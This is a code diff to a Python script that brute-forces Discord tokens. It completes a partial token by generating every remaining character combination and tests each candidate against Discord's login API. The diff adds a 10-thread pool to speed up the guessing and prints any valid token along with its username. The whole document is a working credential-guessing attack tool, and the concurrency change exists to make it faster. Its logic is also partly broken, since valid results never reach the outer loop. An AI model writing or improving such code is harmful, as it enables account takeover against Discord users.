@@ -1,3 +1,5 @@
+import concurrent.futures
+
 HOWLONGATOKENIS = 59
 CurrentToken = input("Enter your token: ")
 guessLength = HOWLONGATOKENIS - len(CurrentToken)
@@ -26,20 +28,43 @@ random.shuffle(possibleChars)
 possibleChars = "".join(possibleChars)
 
 
+async def validateToken(token):
+    client = discord.Client()
+    try:
+        data = await client.http.static_login(token.strip(), bot=True)
+        print("\n")
+        print(f'{token} is a valid token!, username: {data["username"]}#{data["discriminator"]}')
+        return token
+    except:
+        pass
+    await client.close()
+
+
+def validateWrapper(args):
+    asyncio.run(validateToken(args))
+
+
 async def goooooooo():
-    for i in tqdm(range(totalCombos)):
+    futures = []
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
+    for i in range(totalCombos):
         combos = generateCombos(guessLength, i)
         combos = CurrentToken + combos
-        client = discord.Client()
-        try:
-            data = await client.http.static_login(combos.strip(), bot=True)
-            print(combos)
-            print(data)
-            print("\n")
-            break
-        except Exception as e:
-            pass
-        asyncio.get_event_loop().create_task(client.close())
+        futures.append(executor.submit(validateWrapper, combos))
+
+    with tqdm(total=totalCombos) as pbar:
+        while True:
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    data = future.result()
+                    if data:
+                        print(data)
+                        print("WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW")
+                        print("\n")
+                        break
+                except Exception as e:
+                    pass
+            await asyncio.sleep(0.1)
 
 
 asyncio.get_event_loop().run_until_complete(goooooooo())
